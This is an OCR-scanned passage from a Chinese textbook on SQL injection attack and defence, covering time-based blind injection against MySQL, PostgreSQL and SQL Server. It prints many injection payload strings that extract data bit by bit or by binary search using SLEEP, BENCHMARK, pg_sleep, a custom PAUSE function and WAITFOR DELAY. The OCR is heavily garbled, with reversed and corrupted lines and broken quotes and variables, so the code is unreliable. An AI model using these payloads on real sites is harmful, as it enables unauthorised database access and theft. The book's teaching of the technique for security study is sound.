I*m dreaming 1
e1
1 ror in set; (4.17 sec)
图5-4执行 MySQL 的 SLEEPO函数
对于未包含SLEEPO函数的MySQL版本，可以使用BENCHMARKO函数复制SLEEPO函
数的行为。BENCHMARKO的函数原型为 BENCHMARK(N,expression)，其中expression 为某个
SQL表达式，N是该表达式要重复执行的次数。BENCHMARKO函数与SLEEPO函数的主要差
别在于：BENCHMARKO函数向查询中引I入了一个可变但非常显著的延迟，而SLEEPO函数则
强制产生一个固定的延迟。如果数据库运行在高负载下，那么BENCHMARKO将执行得更加
200
---
## Page 215
第5章SQL盲注利用
缓慢，但由于这一显著延迟变得更加突出面非减弱，因面在推断攻击中BENCHMARKO仍然
很有用。
表达式执行起来非常快，要想看到查询中的延迟，就需要将它们执行很多次。如果表达式
并非计算密集型表达式，为了在发起请求时减少行的跳跃，N可以取1000000000或更大的值。
表达式必须是标量（scalar），这样返回单个值的函数才会有用，就像返回标量的子查询。下面是
几个BENCHMARKO函数的例子，其中包含每个函数在MySQL安装上的执行时间：
SELECT BENCHMARK (1000000, SHA1 (CURRENT_USER))  (3.01 SeCOnds)
SELECT BENCHMARK(100000000, (SELECT 1)) (0 .93 8eConds)
SELECT BENCHMARK(100000000, RAND ()) (4.69 8eConds)
这些代码非常简洁，但如何使用MySQL中的延迟查询来实现一个基于推断的SQL盲注攻
击呢？最好通过例子来讲清这个问题，接下来将引入一个简单的应用示例。从现在开始我们会
在本章中一直使用它。该例包含一张名为reviews的表，其中存储了电影评论数据。表中的列
名依次为 idreview_author 和l review_content。 访间页i http://www.victim.com/count_reviews. php？
review_author=MadBob时，将运行下列查询：
SELECT COUNT(*) FROM reviews KHERE review_author='MadBob*
可进行的最简单的推断是我们是否在作为超级用户运行查询。可以使用两种方法，一种是
使用 SLEEPO：
SELECT COUNT(*) FROM reviews KHERE review_author='MadBob* UNION
SELECT IF (SUBSTRING (USER () , 1, 4)=′ rOot′, SLEEP (5) , 1)
另一种是使用BENCHMARKO：
SELECT COUNT(*) FROM reviews KHERE revIew_author='MadBob* UNION
SELECT IF (SUBSTRING (USER () , 1, 4) -*root ′, BENCHMARK(100000000, RAND ()) , 1)
当将它们转换为页面请求时，它们变为：
count_revievs ,php?reviev_author=MadBob* UNION SELECT
IF (SUBSTRING (USER () , 1, 4) =0x726f6f74, SLEEP (5) , 1) #
和
count_revievs ,php?review_author=MadBob* UNION SELECT
IF (SUBSTRING (USER () , 1, 4) 0x726f6f74, BENCHMARK (100000000, RAND ()) , 1) #
（请注意，上面使用字符串0x726f6f74替换了root，这是一种常见的转义技术，该技术使
我们不使用引号就可以指定字符串。每个请求尾部出现的“#”用于注释后面的字符）
回想一下，我们可通过二分搜索方法或逐位方法来推断数据。之前已经深入讲解了这些方
法的基础技术和理论，接下来我们将给出这两种方法的利用字符串。
1）通用的MySQL二分搜索推断漏润
下面是一个学符串注入点的例子（请注意，该漏润需要进行格式处理以保证从UNION
SELECT获取的列数与第一个查询中的列数匹配）：
‘UNION SELECT IF (ASCII (SUBSTRING ( () , /, 1))> k, SLEEP (1) , 1) #
201
---
## Page 216
SQL注入攻击与防御（第2版）
 UNION SELECT IF (ASCII (SUBSTRING(() , /, 1))> k, BENCHMARK(100000000,
RAND () ) , 1) #
下面是一个数字注入点的例子：
+ if (ASCII (SUBSTRING((*) , /, 1))> , BENCHMARK(100000000, RAND ()), 1) #
+ f (ASCII (SUBSTRING ((**), /, 1))> k, SLEEP (5) , 1)#
其中i是由子查询（..)返回的第i个字节，k是当前二分搜索的中间值。如果推断问题返回
TRUE，那么响应会被延迟。
2)通用的MySQL逐位推断漏洞
下面是一个字符串注入点的例子，使用了“按位与”，也可以替换为其他的位运算符（请注
意，当使用这些漏润来匹配UNIONSELECT获取的列数与第一个查询中的列数时，要求对它
们进行格式处理）：
‘UNION SELECT IF (ASCII (SUBSTRING ( (**) , /, 1) ) &2′=2, SLEEP (1) , 1) #
‘UNION SELECT IF (ASCII (SUBSTRING ( (***) , /, 1) ) &2′=2′, BENCHMARK (100000000,
RAND () ) , 1) #
下面是数字注入点的例子：
+ if (ASCII (SUBSTRING ( (**) , / , 1) ) s2′ =2”, SLEEP (1) , 1) #
+ if (ASCII(SUBSTRING((),/,1))2′=2²,BENCHMARK(100000000, RAND ()), 1)
+ if (ASCII (SUBSTRING ( ("*) , /, 1) ) 12′ >ASCII (SUBSTRING( (**) ,  /, 1)) , SLEEP (1) , 1#
+ f (ASCII (SUBSTRING ( (***) , /, 1) ) (2′ >ASCII (SUBSTRING ((**) 。/ , 1)) ,
BENCHMARK (100000000, RAND ()) , 1)#
+ f (ASCII (SUBSTRING ( (**) , /, 1) ) ^2” kSLEEP(5).1)、利
用片段会产生一个500秒的延迟。乍看上去这似乎与我们想要的内容刚好相反，但实际上却可
以评估表的大小。进一步讲，由于SLEEPO可以按微秒数暂停，固此即使一张表里包含上千行
或上百万行，也仍然可以保证查询的总延迟不过几秒而已。
2.PostgreSQL延迟技术
在PostgreSQL中，有两种可能的方法在查询中引|入延迟，所采用的方法取决于PostgreSQL
的版本。如果是8.1或更低的版本，那么可以在SQL中创建一个函数，在该函数中必定使用了
系统库的slcepO函数。但在8.2及更高的版本中，已经不可能使用这种方式，因为扩展库需要
定义magic constant，而系统库没有magic constant。相反，PostgreSQL提供了一个pg_sleepO函
202
---
## Page 217
第5章SQL盲注利用
数，它是默认安装的一部分，也正是我们需要的功能。Pg_sleepO函数将使执行暂停指定的秒数
（微小的组件还允许执行）.但是，Pg_sleepO函数的返回类型是void，这引入了新的复杂性，因
为void类型无法用在典型的WHERE子句中。虽然很多PostgreSQL驱动程序支持与SQLServer
风格类似的堆叠查询（stackedquery)，但第2个查询（条件是Pg_sleepO函数的返回值的类型为
void)将由当前正在执行的应用程序进行处理，这会导致一个错误。例如，虽然下面的查询将使
执行暂停数秒，但在处理意外的结果集时，当前应用程序将失败：
SELECT * FROM reviews WHERE review_author='MadBob'; SELECT CASE 1
fGN3 (t) dooTs6d N3HL I N3HM
对于这种情况，一个解决方案就是简单地添加第三个哑查询（dummyquery)，它返回正确数
量的列：
SELECT * FROM reviews WHERE review_author='MadBob'; SELECT CASE 1
WHEN 1 THEN P9_sleep (1) END; SELECT NULL, NULL, NULL;
对于拆分与平衡方式来说，这种办法过于笨拙。如果数据库连接是由数据库所有者发起的
或者连接数据库的用户具有创建PL/pgSQL函数的权限，就可以构造一个新函数来封装pg_sleepO，
并使新函数返回一个值，这样一来在拆分与平衡方法中就可以使用新函数取代pg_sleepO。
PostgreSQL支持使用一种名为PL/pgSQL的过程化语言来定义SQL代码块，甚至可以将创建
函数的权限分配给非超级用户(non-superuser)的账号。但是，数据库拥有者必须为每个数据库
单独启用PL/pgSQL语言。
如果当前连接数据库的用户是数据库拥有者，下面的查询将启用PL/pgSQL：
在启用了PL/pgSQL之后（或者它已经可用)，接下来的步骤就是定义封装函数PAUSEO
它接收一个表示延迟时间的参数：
DECLARE
wait alias for $1;
BEGIN
PERFORM pg_sleep (wait) 
RETURN 1;
END;
$$ LANGUAGE*plpgsq1′ STRICT;
在该函数的定义中，是否换行书写代码无关紧要。可以将整个函数的定义放在一行代码中，
这样使用起来更加方便。
一旦新函数创建完毕，就可以在查询中直接调用该函数：
SELECT COUNT(*) FROM revievs WHERE id=1+(SELECT CASE ( expression ) WHEN
(Condition ) THEN PAUSE (5) ELSE 1 END)
下面是一个漏洞利用字符申，用于测试当前连接数据库的用户是否是超级用户（superuser)：
count_reviews .php7id1+ (SELECT CASE (SELECT usename FROM p9_user WHERE
usesuper IS TRUE and current_user=usename) WHEN (user) THEN PAUSE (5)
203
---
## Page 218
SQL注入攻击与防御（第2版）
ELSE 1 END)
下面将介绍用于二分搜索法和逐位方法的漏洞利用字符串。
1）通用的PostgreSQL二分搜索法漏洞推断
使用堆叠查询和用户自定义pauscO函数的注入字符串：
*; SELECT CASE WHEN (ASCII (SUBSTR(, /,1)) > k) THEN pg_sleep (1) END;
*11(SELECT CASE WHEN (ASCII (SUBSTR(, /, 1)) > ) THEN PAUSE (1) ELSE 1
SELECT NULL, *", NULL; =*
--f(GN3
使用堆叠查询和用户自定义pauseO函数的数值注入：
0; SELECT CASE wHEN (ASCII (SUBSTR(, /,1)) > k) THEN P9_sleep (1) END;
SELECT NULL, **, NULL; =
+ (SELECT CASE WHEN (ASCII (SUBSTR(, /,1)) > k) THEN PAUSE (1) ELSE 1
-f(GN3
其中，i是子查询（..)返回的第i个字节，而k是当前二分搜索的中间值。如果推断间题返
回TRUE，该响应将被延迟。
2)通用的PostgreSQL逐位方法漏洞推断
使用按位与(bitwiseAND）的注入字符串，可替换为其他bit：
′; SELECT CASE WHEN (ASCII (SUBSTR(", /,1))&2 =2′) THEN P9_s1eep (1) END;
SELECT NULL, ", NULL
′11 (SELECT CASE WHEN (ASCII (SUBSTR(-"*, /, 1)) &2 =2′) THEN PAUSE (1) ELSE 1
END) /=*
数值注入：
0; SELECT CASE WHEN (ASCII (SUBSTR(", /, 1) &2 /=2′) THEN P9_sleep (1) END;
(SELECT CASE WHEN (ASCII (SUBSTR("*, /,1)&2 /=2′) TREN PAUSE(1) ELSE 1
SELECT NULL, ***, NULL/ =*
--f(GN3
其中，i是子查询（..)返回的第i个字节，面j则是我们感兴趣的位（第1位是最低有效位，
第8位是最高有效位)。
3.SQL Server 延迟
SQLServer提供了一种明确的暂停任何查询执行的能力。使用WAITFOR关键字可促使
SQLServer将查询中止一段时间后再执行。这里的时间既可以是相对时间（相对于执行到
WAITFOR关键字的时间)，也可以是绝对时间(比如午夜)。通常使用的是相对时间，这需要用
到DELAY关键字。要想将执行暂停1分53秒，可以使用WAITFORDELAY“00:01:53，其结
果是一个确实执行了1分53秒的查询，如图5-5所示。查询花费的时间显示在窗口底部的状
态栏中。请注意，这并不是为执行时间强加上界。我们不是告诉数据库只执行1分53秒，面
是将查询正常的执行时间增加1分53秒，因此延迟是个下界。
204
---
## Page 219
第5章SQL盲注利用
Query-W2K3-S4P5.sgfi_sql05.sa-Untitled2*
MOX
conmand (s) comp leted successfully.
GnidsMesage
w2K3-54P5 (sa(53)sol_sql050:01:530rowsLn2, Col 1
图 5-5执行 WAITFOR DELAY
秘密手记
在MicrosoftSQLServer和其他数据库上模拟BENCHMARK()
2007年年中，ChemaAlonso发布了一项利用SQLServer中一种额外的处理负载
(processingload）来复制延长查询的MySQLBENCHMARKO效果的新技术，从而为数据
推断提供了另一种机制—不需要再使用SLEEPO类型的函数。该技术使用两个通过逻
辑“与”隔开的子查询，其中一个子查询的执行时间为很多秒，另一个子查询包含一个
推断检查，如果检查失败（第x位为0），第二个子查询将返回，第一个子查询则因受“与”
子句的影响而提前中止，实际结果是，如果正在推断的位为1，那么请求将花费比位为
0时更多的时间，该技术很有趣，它进开了那些明确禁止WAITFORDELAY关键字的
检查。
Alonso发布了一个采用这种思想实现的工具，可用在MicrosoftAccess、MySQL、
SQL Server 和 Oracle 上，该工具可从www.codeplex.com/marathontool上下载。
由于不能在子查询中使用WAITFOR关键字，因面我们将无法得到在WHERE子句中使用
了WAITFOR的漏润利用字符串。但是SQLServer支持堆叠查询，而堆叠查询对上述情况很有
用。我们需要遵从的方法是：构造一个漏洞利用字符串并将其附加到合法查询的后面，以分号
作为分隔符。与PostgreSQL数据库不同，由于SQLServer驱动程序把第一个查询的输出返回
给正在执行处理的应用程序，因此这种方式是有效的。
接下来看一个示例应用，除了运行在SQLServer和ASP.NET上之外，它与前面介绍的使
用MySQL的电影评论应用完全相同。页面请求count_reviews.aspx?review_author-MadBob，运
行的SQL查询如下所示：
SELECT CoUNT (*) FROM revievs WHERE review_author=*MadBob *
为确定登录数据库的用户是否为sa，可执行下列SQL：
SELECT CoUNT (*) FROM revievs WHERE review_author=*MadBob′: IF
SYSTEX_USER=′sa′ KAITFOR DELAY *00 :00:05*
如果请求花费的时间多于5秒，可以推断登录的用户为sa。将上述语句转换成页面请求后
变为：
205
---
## Page 220
SQL注入攻击与防御（第2版）